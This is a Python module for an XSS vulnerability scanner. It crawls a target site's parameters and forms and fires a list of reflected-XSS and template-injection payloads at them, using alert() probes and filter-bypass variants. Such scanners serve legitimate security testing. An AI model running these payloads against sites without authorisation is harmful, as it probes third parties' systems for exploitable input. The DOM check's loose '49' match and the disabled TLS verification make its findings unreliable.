import requests
import re
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, urljoin
from .base import BaseScanner, ScanResult, Finding, Severity

XSS_PAYLOADS = [
    '<script>alert("VulnPy")</script>',
    '<img src=x onerror=alert("VulnPy")>',
    '<svg onload=alert("VulnPy")>',
    '"><script>alert("VulnPy")</script>',
    "javascript:alert('VulnPy')",
    '<iframe src="javascript:alert(\'VulnPy\')">',
    '<body onload=alert("VulnPy")>',
    '<input onfocus=alert("VulnPy") autofocus>',
    '<marquee onstart=alert("VulnPy")>',
    '<details open ontoggle=alert("VulnPy")>',
    '<math><mtext><table><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(1) src=1>">',
    '"><img src=x onerror=alert("VulnPy")>',
    "'-alert('VulnPy')-'",
    '{{7*7}}',
    '${7*7}',
    '<scr<script>ipt>alert("VulnPy")</scr</script>ipt>',
    '%3Cscript%3Ealert("VulnPy")%3C/script%3E',
]

DOM_XSS_MARKERS = [
    "document.URL", "document.documentURI", "document.referrer",
    "location.href", "location.search", "location.hash",
    "window.name", "document.write", "eval(",
    "innerHTML", "outerHTML",
]

class XSSScanner(BaseScanner):
    name = "xss"
    description = "Detect Cross-Site Scripting vulnerabilities (Reflected, DOM-based)"

    def scan(self, target: str, **kwargs) -> ScanResult:
        result = ScanResult(scanner_name=self.name, target=target)
        urls = self._discover_urls(target)

        for url in urls:
            params = parse_qs(urlparse(url).query)
            if not params:
                continue

            for param in params:
                self._test_reflected(url, param, result)
                self._test_dom(url, param, result)

        return result

    def _discover_urls(self, target: str) -> list:
        urls = []
        if "?" in target:
            urls.append(target)
        else:
            test_params = ["q", "search", "name", "input", "query", "page",
                          "redirect", "url", "link", "callback", "next", "ref"]
            for param in test_params:
                urls.append(f"{target}/?{param}=test")
            try:
                response = requests.get(target, timeout=10, verify=False)
                links = re.findall(r'href=["\']([^"\']*\?[^"\']+)["\']', response.text)
                for link in links[:15]:
                    if link.startswith("http"):
                        urls.append(link)
                    elif link.startswith("/"):
                        urls.append(f"{target.rstrip('/')}{link}")
                forms = re.findall(r'<form[^>]*action=["\']([^"\']*)["\']', response.text)
                for form in forms[:5]:
                    if form.startswith("http"):
                        urls.append(form)
                    elif form.startswith("/"):
                        urls.append(f"{target.rstrip('/')}{form}")
            except:
                pass
        return urls

    def _test_reflected(self, url: str, param: str, result: ScanResult):
        for payload in XSS_PAYLOADS:
            try:
                test_url = self._inject_param(url, param, payload)
                response = requests.get(test_url, timeout=10, verify=False)
                if payload in response.text:
                    result.findings.append(Finding(
                        title=f"Reflected XSS in '{param}'",
                        severity=Severity.HIGH,
                        description=f"Parameter '{param}' reflects input without sanitization",
                        evidence=f"Payload: {payload}\nReflected in response body",
                        recommendation="Encode all user input, use Content-Security-Policy headers",
                        metadata={"url": url, "param": param, "type": "reflected", "payload": payload}
                    ))
                    return
            except requests.RequestException:
                continue

    def _test_dom(self, url: str, param: str, result: ScanResult):
        try:
            response = requests.get(url, timeout=10, verify=False)
            has_dom_sink = any(marker in response.text for marker in DOM_XSS_MARKERS)
            if has_dom_sink:
                test_url = self._inject_param(url, param, '{{7*7}}')
                resp2 = requests.get(test_url, timeout=10, verify=False)
                if '49' in resp2.text:
                    result.findings.append(Finding(
                        title=f"Potential DOM XSS via '{param}'",
                        severity=Severity.MEDIUM,
                        description=f"Parameter '{param}' may be processed by client-side JavaScript",
                        evidence="DOM sink detected with template expression evaluation",
                        recommendation="Sanitize input on client-side, avoid dangerous DOM methods",
                        metadata={"url": url, "param": param, "type": "dom"}
                    ))
        except requests.RequestException:
            pass

    def _inject_param(self, url: str, param: str, payload: str) -> str:
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        params[param] = [payload]
        new_query = urlencode(params, doseq=True)
        return urlunparse(parsed._replace(query=new_query))
